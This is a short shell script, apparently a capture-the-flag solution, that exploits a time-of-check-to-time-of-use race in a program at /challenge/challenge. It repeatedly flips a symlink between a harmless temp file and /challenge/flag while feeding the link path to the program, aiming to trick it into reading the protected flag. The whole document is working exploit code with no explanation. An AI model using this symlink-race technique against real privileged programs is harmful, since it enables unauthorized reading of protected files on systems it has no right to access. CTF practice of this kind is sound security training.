touch temp_file
while :
do
	ln -sf temp_file link
	echo "/tmp/99202/link" | /challenge/challenge &
	ln -sf /challenge/flag link
	rm link
done
